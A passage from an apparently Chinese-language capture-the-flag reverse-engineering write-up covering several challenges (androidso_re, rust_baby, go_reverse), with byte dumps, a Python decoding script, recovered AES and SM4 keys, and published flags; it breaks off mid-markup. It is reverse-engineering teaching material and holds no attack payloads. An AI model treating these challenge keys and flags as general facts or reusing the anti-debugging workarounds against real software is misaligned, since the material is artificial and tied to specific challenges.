class="string">__const:0000000100003F19 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F1A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1C 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F1D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F1E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F20 E7                            DCB 0xE7</span></span><br><span class="line"><span class="string">__const:0000000100003F21 26                            DCB 0x26 ; &amp;</span></span><br><span class="line"><span class="string">__const:0000000100003F22 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F23 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F24 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F25 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F26 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F27 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F28 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F29 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F2A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F2D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F2E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F30 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F31 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F32 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F33 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F34 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F35 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F36 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F37 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F38 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F39 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F3D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F40 F7                            DCB 0xF7</span></span><br><span class="line"><span class="string">__const:0000000100003F41 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F42 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F43 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F44 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F45 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F46 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F47 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F48 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F49 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F4A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F4D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F4E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F50 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F51 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F52 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F53 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F54 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F55 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F56 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F57 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F58 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F59 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F5D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F5E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F5F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F60 67                            DCB 0x67 ; g</span></span><br><span class="line"><span class="string">__const:0000000100003F61 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F62 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F63 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F64 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F65 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F66 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F67 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F68 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F69 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6C C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F6D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F6E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F6F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F70 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F71 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F72 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F73 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F74 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F75 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F76 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F77 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F78 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F79 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F7A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F7D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F7E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F7F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F80 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F81 0F                            DCB  0xF</span></span><br><span class="line"><span class="string">__const:0000000100003F82 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F83 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F84 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F85 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F86 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F87 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F88 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F89 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F8A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8C 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F8D 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F8E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F8F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F90 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F91 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F92 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F93 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F94 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F95 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F96 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F97 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F98 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F99 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F9A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9C D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F9D 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F9E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F9F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA0 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003FA1 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003FA2 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA3 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA4 87                            DCB 0x87</span></span><br><span class="line"><span class="string">__const:0000000100003FA5 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003FA6 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003FA7 00                            DCB    0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割数据</span></span><br><span class="line">lines = data.strip().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化结果列表</span></span><br><span class="line">result = []</span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    parts = line.split()</span><br><span class="line">    byte_data = parts[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    hex_data = <span class="built_in">int</span>(byte_data, <span class="number">16</span>)</span><br><span class="line">    a = <span class="built_in">hex</span>(hex_data)[<span class="number">2</span>:]</span><br><span class="line">    a = a.zfill(<span class="number">2</span>)</span><br><span class="line">    k = a+k</span><br><span class="line">    f+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> f==<span class="number">4</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">        result.append(<span class="string">&quot;0x&quot;</span>+k)</span><br><span class="line">        k = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    result[i] = <span class="built_in">int</span>(result[i],<span class="number">16</span>)</span><br><span class="line">    result[i]-=<span class="number">0x1e</span></span><br><span class="line">    result[i]^=<span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">    result[i]-=<span class="number">0x14</span></span><br><span class="line">    result[i]//=<span class="built_in">ord</span>(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">pl(result)</span><br><span class="line"><span class="comment">#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="androidso-re"><a href="#androidso-re" class="headerlink" title="androidso_re"></a>androidso_re</h2><p>感谢Z神的帮助，不然凭借我垃圾的安卓能力，一定会被吊死的QAQ</p><p>之后做安卓题的时候</p><p>先用die查看存档记录：</p><p><img src="https://s2.loli.net/2024/05/31/onbZYyuX4JrI83f.png" alt="image-20240531202856657"></p><p>这个存档记录不知道什么意思，但是后面有写对应的安卓版本，如果使用dex编辑器可以看到mainactivity在classes3.dex中，</p><p><img src="https://s2.loli.net/2024/05/31/Tcp2D3Mtrmjgwxz.png" alt="image-20240531204001444"></p><p>这个表明要用安卓7来打开它QAQ</p><p>之前试过用安卓10来调试，结果百分百寄，痛苦，用ida调so也断不了，QAQ</p><p>于是可以顺利用安卓7打开来调试</p><p>jadx：</p><p><img src="https://s2.loli.net/2024/05/31/yP7mhFSEjxKeCiw.png" alt="image-20240531204430593"></p><p>直接拿到密钥和iv</p><p>直接解</p><p><img src="https://s2.loli.net/2024/05/31/CXcNs7Oa3H5bv8t.png" alt="image-20240531204507379"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">188</span>cba<span class="number">3</span>a<span class="number">5</span><span class="keyword">c</span><span class="number">0</span>fbb<span class="number">2250</span>b<span class="number">5</span>a<span class="number">2e590</span><span class="keyword">c</span><span class="number">391</span>ce&#125;</span><br></pre></td></tr></table></figure><h2 id="rust-baby"><a href="#rust-baby" class="headerlink" title="rust_baby"></a>rust_baby</h2><p>打开文件</p><p>随便调一下，看到一个一大串连续的指令，应该就是加密‭‭‭<br>看到有一堆base64，解一下</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;henhenaaa!&quot;</span>:[<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">        <span class="string">&quot;cryforhelp&quot;</span>:<span class="string">&quot;igdydo19TVE13ogW1AT5DgjPzHwPDQle1X7kS8TzHK8S5KCu9mnJ0uCnAQ4aV3CSYUl6QycpibWSLmqm2y/GqW6PNJBZ/C2RZuu+DfQFCxvLGHT5goG8BNl1ji2XB3x9GMg9T8Clatc=&quot;</span>,</span><br><span class="line">        <span class="string">&quot;whatadoor&quot;</span>:<span class="string">&quot;1145141919810WTF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iwantovisit&quot;</span>:<span class="string">&quot;O0PSwantf1agnow1&quot;</span></span><br><span class="line">        &#125;&#123;</span><br><span class="line">    <span class="string">&quot;where&quot;</span>:<span class="string">&quot;where is your flag?:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;omg&quot;</span>:<span class="string">&quot;correct flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nonono&quot;</span>:<span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;where&quot;</span><span class="punctuation">:</span><span class="string">&quot;where is your flag?:&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;omg&quot;</span><span class="punctuation">:</span><span class="string">&quot;correct flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nonono&quot;</span><span class="punctuation">:</span><span class="string">&quot;nope, wrong flag&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>由于一开始看到了isdebugpresent，所以尝试了附加调试，但是调试的时候发现程序会直接退出</p><p><img src="https://s2.loli.net/2024/05/31/arOtlpSWmDZGj8e.png" alt="image-20240531221756988"></p><p>是因为这个程序有多个线程，这个时候不是main线程，这时要先切换到main线程再继续调试。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11111111111</span></span><br><span class="line"><span class="number">00112233</span></span><br><span class="line">aaaaaaaaaaa</span><br><span class="line">``aabbcc</span><br><span class="line"></span><br><span class="line">-<span class="number">1</span> -<span class="number">1 0 0 1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>不写了，shi</p><p>QAQ</p><h2 id="go-reverse"><a href="#go-reverse" class="headerlink" title="go_reverse"></a>go_reverse</h2><p>go逆向</p><p>看到函数表</p><p><img src="https://s2.loli.net/2024/06/04/e8whYgxBtiCNnkV.png" alt="image-20240604004730098"></p><p>在main开头的函数里找到了这个</p><p><img src="https://s2.loli.net/2024/06/04/JODUWdTupR6IwAk.png"></p><p>怀疑是aes cbc，经过分析，应该是</p><p>xor-tea-sm4-aes-base32</p><p>然后想了很久，硬是没发现flag是在哪里的，最后放弃，去找flag，发现那个题是环境题，题目只给了最后的secret</p><p>那么假定</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZR<span class="number">23</span>CZDIW<span class="number">3</span>Q<span class="number">73</span>KKTC<span class="number">3</span>UJKE<span class="symbol">NFAHFUFKOBNMM7</span>FCHXGGY<span class="number">3</span>BJY<span class="number">3</span>B<span class="number">4</span>FWQ<span class="number">4</span>DCI<span class="number">5</span>DQOEEM<span class="name">M5</span>I<span class="number">6</span><span class="meta">O5</span>AZRABU<span class="symbol">NXA7</span>CVWEDYKDOT<span class="number">4</span>JL<span class="attr">VSLE3</span>WFGXI=</span><br></pre></td></tr></table></figure><p>这个是我的secret，QAQ</p><p>解完base32后解AES，这里看到了两个值</p><p>dPGWgcLpqmxw3uOXhKpKV009Cql和Bs^8*wZ4lu8oR&amp;@k</p><p>第一个是密钥可以解密，第二个应该是iv</p><p>然后继续看sm4，传入了Bs^8*wZ4lu8oR&amp;@kpg5g#k6Qo3L&amp;1EzT</p><p>如果用流程图可以看到</p><p><img src="https://s2.loli.net/2024/06/05/ILDEUdgBoGJ7TrX.png" alt="image-20240605180853890"></p><p>这里说明了模式是CTR,逐步动调，分别可以看到一个128位值，一个16位值，和在自己写的flag下面两段相同的32位值，以及动调两步，在加密完后上面32位值下面添加了32位值</p><p>再动调，值没了</p><p><img src="https://s2.loli.net/2024/06/05/23r9mRsMofBz4Yh.png" alt="image-20240605182238963"></p><p>而下一步的输入</p><p><img src="https://s2.loli.net/2024/06/05/4JnEtmdslN1HWOj.png" alt="image-20240605182501943"></p><p>用这个可以猜aes的key和iv的值</p><p><img src="https://s2.loli.net/2024/06/05/8PnRoEYkI7XTZMr.png" alt="image-20240605183107505"></p><p>发现key和iv是一样的，同理，后面也不知道SM4是怎么加密的</p><hr><p>下面的调试步骤一共调了5次，可能数据对不上QAQ</p><p>观察输入和输出，已知key：pg5g#k6Qo3L&amp;1EzT</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Dump <span class="number">0xC00001E480</span> - <span class="number">0xC00001E4A0</span> (<span class="number">32</span> bytes) :</span><br><span class="line">[<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>]</span><br><span class="line"></span><br><span class="line">[+] Dump <span class="number">0xC00001A330</span> - <span class="number">0xC00001A360</span> (<span class="number">48</span> bytes) :</span><br><span class="line">[<span class="number">0xA8</span>, <span class="number">0x37</span>, <span class="number">0x7D</span>, <span class="number">0xE3</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0xAE</span>, <span class="number">0xEF</span>, <span class="number">0xEC</span>, <span class="number">0x0E</span>, <span class="number">0x53</span>, <span class="number">0x26</span>, <span class="number">0x1F</span>, <span class="number">0x74</span>, <span class="number">0xCA</span>, <span class="number">0x39</span>, <span class="number">0xD2</span>, <span class="number">0x73</span>, <span class="number">0x5A</span>, <span class="number">0xA6</span>, <span class="number">0x69</span>, <span class="number">0xEB</span>, <span class="number">0xF4</span>, <span class="number">0x7E</span>, <span class="number">0xF1</span>, <span class="number">0x56</span>, <span class="number">0x6B</span>, <span class="number">0x93</span>, <span class="number">0xEE</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x3A</span>, <span class="number">0x73</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0xEC</span>, <span class="number">0xAE</span>, <span class="number">0xD1</span>, <span class="number">0x05</span>, <span class="number">0x6D</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x38</span>, <span class="number">0xEA</span>, <span class="number">0x47</span>]</span><br></pre></td></tr></table></figure><p>从32变成了48，sm4是块加密，一块为128位，16字节，输入正好是16的倍数，不应该增加位数，</p><p>再次调试，发现input是一样的，也就是说这里是先干了其它的然后才SM4</p><p>继续调试：可以推测128字节的值是s盒</p><p>在一个位置得到一个16长度的值s，值是</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xF5</span>, <span class="number">0xEE</span>, <span class="number">0x67</span>, <span class="number">0xFD</span>, <span class="number">0xD9</span>, <span class="number">0x8D</span>, <span class="number">0xD2</span>, <span class="number">0xA2</span>, <span class="number">0xCB</span>, <span class="number">0xAC</span>, <span class="number">0x8A</span>, <span class="number">0x44</span>, <span class="number">0x90</span>, <span class="number">0x17</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>]</span><br></pre></td></tr></table></figure><p>下断点，发现它在加密中被读取了，并发现输入在后面被填充了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x71</span>, <span class="number">0xBF</span>, <span class="number">0xC2</span>, <span class="number">0x5A</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA0</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0xF3</span>, <span class="number">0x51</span>, <span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x3C</span>]</span><br></pre></td></tr></table></figure><p>然后s被添加了值变成了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x44</span>, <span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x64</span>]</span><br></pre></td></tr></table></figure><p>有32个，后面添加的值只有最后一位从44变成了64</p><p>输入在后面添加了值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x16</span>, <span class="number">0xCB</span>, <span class="number">0xBF</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x17</span>, <span class="number">0x24</span>, <span class="number">0x77</span>, <span class="number">0x5C</span>, <span class="number">0xAB</span>, <span class="number">0x8F</span>, <span class="number">0xA1</span>, <span class="number">0x0D</span>, <span class="number">0x4E</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/omLaOgvq9ZEupWe.png" alt="image-20240605204649515"></p><p>rax保存了这个值，定位var28</p><p>重调：</p><p><img src="https://s2.loli.net/2024/06/05/8jrNsa1xUFbVPCM.png" alt="image-20240605212044032"></p><p>在输入末尾</p><p><img src="https://s2.loli.net/2024/06/05/icy1wO9dkbgUeGJ.png" alt="image-20240605212131738"></p><p>临近结束，这个状态还在，保存一下值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input_ = [<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br><span class="line">p = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xD9</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/9eXj4CqIRWMgEdi.png" 